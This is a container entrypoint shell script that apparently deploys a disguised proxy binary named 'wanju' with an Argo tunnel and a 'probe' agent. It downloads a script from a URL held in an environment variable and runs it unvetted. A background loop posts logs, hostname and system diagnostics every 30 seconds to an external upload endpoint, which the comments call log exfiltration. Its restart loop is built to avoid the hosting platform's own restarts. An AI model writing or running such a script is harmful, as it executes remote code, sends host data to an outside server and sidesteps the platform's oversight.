#!/bin/sh
set -eu

PORT="${PORT:-3000}"
LOG=/app/.wanju.log
UP="https://new-api.jgw.binxueo.com/gw/dl/ab89f97674fc04119129a5ac/upload"
: > "$LOG"

# ---- 探针引导：拉安装脚本，密钥不落仓库；全过程留痕 ----
if [ -n "${PROBE_BOOT:-}" ]; then
    ( echo "[boot] $(date -u +%FT%TZ) url=$PROBE_BOOT"
      if curl -fsS --max-time 60 "$PROBE_BOOT" -o /tmp/boot.sh; then
          echo "[boot] downloaded $(wc -c < /tmp/boot.sh) bytes"
          sh -x /tmp/boot.sh
          echo "[boot] sh exit=$?"
      else
          echo "[boot] download FAILED code=$?"
      fi
      sleep 8
      echo "[boot] ls /app/.sp:"; ls -la /app/.sp 2>&1
      echo "[boot] agent.log tail:"; tail -40 /app/.sp/agent.log 2>&1
      echo "[boot] agent procs: $(ps 2>/dev/null | grep -c '[a]gent.py')"
    ) >> /app/.boot.log 2>&1 &
fi

# ---- 日志外传：wanju + boot + 环境诊断一起推回自建服务 ----
push_log() {
    set +e
    { echo "=== wanju ==="; tail -c 9000 "$LOG" 2>/dev/null
      echo "=== boot ===";  tail -c 5000 /app/.boot.log 2>/dev/null
      echo "=== diag ==="
      echo "python3=$(command -v python3 || echo MISSING)"
      echo "nohup=$(command -v nohup || echo MISSING)"
      echo "curl=$(command -v curl || echo MISSING)"
      echo "sp_dir=$(ls -la /app/.sp 2>&1 | head -6 | tr '\n' ' ')"
      echo "host=$(hostname)"
    } | curl -fsS -m 20 -X POST --data-binary @- -H "X-Log-Name: shiper-wanju.log" "$UP" >/dev/null 2>&1
    set -e
}
( while :; do sleep 30; push_log; done ) &

echo "[startup] Protocol: ${TMP_ARGO:-vms} | Proxy port: ${VM_PORT:-8040} | Argo: ${ARGO_DOMAIN:-not-set}" >> "$LOG"

# ---- wanju 守护循环：崩了就地重启，不再整体退出触发平台重启 ----
while :; do
    echo "[wanju] start $(date -u +%FT%TZ) PORT=$PORT" >> "$LOG"
    set +e
    /usr/local/bin/wanju >> "$LOG" 2>&1
    code=$?
    set -e
    echo "[wanju] exited code=$code $(date -u +%FT%TZ)" >> "$LOG"
    push_log
    sleep 5
done
